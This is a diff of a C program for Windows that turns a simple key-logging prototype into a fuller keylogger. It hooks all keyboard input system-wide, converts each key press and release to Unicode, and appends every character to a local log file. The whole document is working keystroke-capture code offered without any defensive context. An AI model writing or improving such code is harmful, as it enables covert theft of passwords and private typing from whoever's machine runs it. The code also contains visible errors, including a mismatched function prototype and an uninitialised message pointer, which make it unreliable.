@@ -1,15 +1,15 @@
 #include <windows.h>
 #include <stdio.h>
+#include <stdlib.h>
 #define LOGFILE "logfile.txt"
+#define DOWN 1
+#define UP 0
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
-FILE *OpenLogFile(void);
-int CloseLogFile(FILE * file);
-int LogToFile(FILE *file, char *key);
+int LogCharToFile(WCHAR *key, int state);
 
 int main(void)
 {
-    // #include "values.h"
     HHOOK hookptr = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
     LPMSG message;
     GetMessage(message, NULL, 0, 0); // to keep program alive
@@ -17,62 +17,66 @@ int main(void)
     UnhookWindowsHookEx(hookptr);
 }
 
-FILE *OpenLogFile(void)
+int LogUnicodeCharToFile(WCHAR *key, int state)
 {
-    FILE *logfile = fopen(LOGFILE, "a");
-    return logfile;
-}
+    FILE *file = fopen(LOGFILE, "a");
 
-int CloseLogFile(FILE * file)
-{
-    return fclose(file);
-}
+    if (state == DOWN)
+    {
+        fputs("[DOWN]  ::  ", file);
+    }
+    else if (state == UP)
+    {
+        // fwprintf(file, L"%s", L"[UP]  ::  ");
+        fputs("[UP]    ::  ", file);
+    }
+    fclose(file);
+    file = fopen(LOGFILE, "a, ccs=UTF-8");
+    fwprintf(file, L"%s", key);
+    fclose(file);
 
-int LogToFile(FILE *file, char *key)
-{
-    int res = fputs(key, file);
+    file = fopen(LOGFILE, "a");
     fputs("\n", file);
+
     fflush(file);
-    return res;
+    fclose(file);
 }
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-    FILE *logfile = OpenLogFile();
 
     if (nCode < 0)
     {
         return CallNextHookEx(NULL, nCode, wParam, lParam);
     }
+
     else
     {
-        PKBDLLHOOKSTRUCT kbstructp = (PKBDLLHOOKSTRUCT)lParam;
+        PKBDLLHOOKSTRUCT KB_struct_pointer = (PKBDLLHOOKSTRUCT)lParam;
+        BYTE state[256];
+        GetKeyboardState(state); //  needs to be done for ToUnicode
+                                 //  to work, even though parameter is supposed to be optional?
+
+        WCHAR buf[10] = {0};
+        int res = ToUnicode(KB_struct_pointer->vkCode, KB_struct_pointer->scanCode, state, buf, 10, 0);
+
+        /*
+        fwprintf(logfile,L"%s", buf);
+        fflush(logfile);
+        CloseLogFile(logfile);
+        */
         if (wParam == WM_KEYDOWN)
         {
-            printf("%X", kbstructp->vkCode);
-            int key = kbstructp->vkCode;
-            switch (key)
+            if (res == 1)
             {
-            case VK_RCONTROL:
-                LogToFile(logfile, "[RIGHT CONTROL] DOWN");
-                break;
-            case VK_LSHIFT:
-                LogToFile(logfile, "[LEFT SHIFT] DOWN");
-                break;
+                LogUnicodeCharToFile(buf, DOWN);
             }
         }
         else if (wParam == WM_KEYUP)
         {
-            printf("%X", kbstructp->vkCode);
-            int key = kbstructp->vkCode;
-            switch (key)
+            if (res == 1)
             {
-            case VK_RCONTROL:
-                LogToFile(logfile, "[RIGHT CONTROL] UP");
-                break;
-            case VK_LSHIFT:
-                LogToFile(logfile, "[LEFT SHIFT] UP");
-                break;
+                LogUnicodeCharToFile(buf, UP);
             }
         }
         return CallNextHookEx(NULL, nCode, wParam, lParam);
